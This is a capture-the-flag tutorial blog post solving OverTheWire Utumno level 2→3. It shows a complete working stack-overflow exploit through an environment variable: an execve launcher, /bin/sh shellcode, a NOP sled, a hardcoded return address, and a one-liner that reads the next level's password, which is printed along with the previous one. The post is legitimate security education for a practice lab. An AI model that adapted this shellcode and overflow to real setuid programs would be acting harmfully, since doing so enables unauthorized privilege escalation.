---
date: 2023-09-10 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Utumno Level 2 → 3 tutorial!!"
permalink: /posts/overTheWire-Utumno-Level-2-to-3/
tags: [overthewire, utumno, pwn, envp, strcpy, shellcode, buffer-overflow, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Utumno Level 2 → 3!!"
---

<!-- Scoped styles -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Utumno level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Utumno-Level-1-to-2/' | relative_url }}">← Previous: Level 1 → 2</a>
  </div>
  <div class="nav-center">
    <a href="https://overthewire.org/wargames/utumno/utumno3.html" target="_blank" rel="noopener">Official (Level 3) ↗</a>
  </div>
  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Utumno-Level-3-to-4/' | relative_url }}">Next: Level 3 → 4 →</a>
  </div>
</nav>

## Login

Use the password from **Level 1 → 2**:

```bash
ssh utumno2@utumno.labs.overthewire.org -p 2227
# password: ceewaceiph
````

Then move to the game folder:

```bash
cd /utumno
```

---

## Task

Binary: **`/utumno/utumno2`**

* Running it prints only: `Aw..` and exits.
* Disassembly shows a **weird argc check** and a **copy from `envp`** into a small stack buffer using `strcpy`.
* Goal: bypass the `Aw..` early-exit, then **overflow the stack via an environment variable**, redirecting execution to our **/bin/sh shellcode**.

---

## Source Code / Disassembly Notes

From `gdb`:

```
main:
  cmp  [ebp+0x8], 0x0          ; if (argc == 0) continue, else print "Aw.." and exit
  je   <take_env_branch>
  puts("Aw.."); exit(1)

<take_env_branch>:
  mov  eax, [ebp+0xc]          ; eax = envp
  add  eax, 0x28               ; skip to the 10th pointer (index 9)
  mov  eax, [eax]              ; eax = envp[9]
  push eax                     ; src
  lea  eax, [ebp-0xc]          ; dst = small local buffer
  push eax
  call strcpy                  ; strcpy(dst, envp[9]) → overflow
  ...
  ret
```

**Key observations:**

* Program only proceeds if **`argc == 0`** (which is never true for a normal exec).
* It then copies **`envp[9]`** (the 10th environment string) into a **12-byte stack buffer** with **`strcpy`** → classic overflow.
* We’ll launch the program via **`execve()`** with **`argv = NULL`** to force `argc==0`, and craft `envp` so that:

  * `envp[9]` contains the **EIP-smashing payload**.
  * Another `envp[k]` holds a **NOP sled + `/bin/sh` shellcode** we can jump to.

---

## Exploitation Steps

### 1) Force `argc == 0` and control `envp`

Write a tiny launcher that calls `execve("/utumno/utumno2", NULL, envp)`:

```c
// execve.c
#include <unistd.h>
int main(void) {
    char *envp[] = { "", "", "", "", "", "", "", "", "",
                     "AAAABBBBCCCCDDDDEEEEFFFFAAAA",
                     NULL };
    execve("/utumno/utumno2", NULL, envp);
    return 0;
}
```

Compile and run:

```bash
gcc -m32 -static execve.c -o execve
./execve
# Segmentation fault (expected)
```

`strace`/`gdb` show EIP control; \~24 bytes reach the return address (you’ll see `0x45454545` if you use `'E'` padding).

---

### 2) Stage shellcode in another env var

We don’t have much room in the overflow string, so put the shellcode in a **separate env var** (with a small NOP sled), and make the overflow overwrite the return address to **jump into it**.

32-bit `/bin/sh` shellcode:

```asm
; shell.asm (32-bit)
global _start
section .text
_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0xb
    int 0x80
```

Assemble + link + extract bytes (one typical pipeline):

```bash
nasm -f elf32 shell.asm
ld -m elf_i386 -s -o shell shell.o
objdump -d ./shell.o | grep '[0-9a-f]:' | grep -v 'file' \
 | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' \
 | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
# -> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

---

### 3) Build the final launcher

* `envp[8]` (or any slot you like) → **NOP sled + shellcode**
* `envp[9]` → **overflow string** ending with the **little-endian return address** pointing into the sled

Example (addresses from the provided run):

```c
// code.c
#include <unistd.h>
int main(void) {
    char *envp[] = {
        "", "", "", "", "", "", "", "",
        /* NOP sled + shellcode */
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
        "\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80",
        /* overflow (24 bytes to EIP) + RET = 0xffffdfb0 */
        "AAAABBBBCCCCDDDD\xb0\xdf\xff\xff",
        NULL
    };
    execve("/utumno/utumno2", NULL, envp);
    return 0;
}
```

Compile and run:

```bash
gcc -m32 -static code.c -o code
./code
$ whoami
utumno3
$ cat /etc/utumno_pass/utumno3
zuudafiine
```

**Why `0xffffdfb0`?** In this run, `gdb` showed the sled around `0xffffdfb0`:

```
x/200x $esp
...
0xffffdfa0: 0x90909000 0x90909090 0x90909090 0x90909090
0xffffdfb0: 0x90909090 0x90909090 0x50c03190 0x732f2f68
...
```

We simply return into the sled.

---

## Password

From my run:

```
zuudafiine
```

---

## Quick One-liner

```bash
cd /tmp && mkdir -p u2 && cd u2 && cat > code.c <<'EOF'
#include <unistd.h>
int main(void){
  char *envp[] = {
    "", "", "", "", "", "", "", "",
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
    "\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80",
    "AAAABBBBCCCCDDDD\xb0\xdf\xff\xff",
    NULL};
  execve("/utumno/utumno2", NULL, envp);
  return 0;
}
EOF
gcc -m32 -static code.c -o code && ./code && whoami && cat /etc/utumno_pass/utumno3
```

---

## Troubleshooting

* **Still seeing “Aw\..” and exit?** You didn’t force `argc==0`. Launch via a helper `execve()` with **`argv = NULL`**.
* **No crash / no EIP control?** Ensure `envp[9]` contains at least **24 bytes** before your 4-byte return address (little-endian).
* **Shellcode doesn’t run?**

  * Make sure your **return address points into the NOP sled** (confirm with `gdb x/200x $esp`).
  * Avoid bad bytes in environment strings.
  * Use more NOPs if needed; adjust the address a little (±0x10).
* **32-bit toolchain errors?** Compile with **`-m32`** and assemble with **`-f elf32`**.

---

**Congrats 🎉** You exploited an **envp-based stack overflow** gated by an **argc==0** trick—great prep for more advanced stack games!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
